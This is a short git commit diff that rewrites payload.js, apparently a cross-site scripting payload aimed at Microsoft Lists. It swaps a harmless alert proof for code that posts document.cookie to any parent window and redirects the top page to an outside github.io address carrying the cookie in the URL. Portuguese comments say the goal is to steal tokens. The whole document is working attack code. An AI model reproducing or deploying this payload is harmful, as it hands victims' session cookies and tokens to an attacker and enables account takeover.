05496fe0f0eac789a2ee3d72f689f446749cc502
Pedro <52047256+pedrojuniorrd@users.noreply.github.com>
2025-05-11 09:25:52 -0300

    Update payload.js

--- payload.js
+++ payload.js
@@ -1,1 +1,5 @@
-<script>alert(document.domain)</script>
+// Enviar dados do Microsoft Lists, se possível
+window.top.postMessage(document.cookie, '*');
+
+// Ou redirecionar a página principal para roubar tokens
+window.top.location = 'https://pedrojuniorrd.github.io/_layouts/payload.js?data=' + encodeURIComponent(document.cookie);
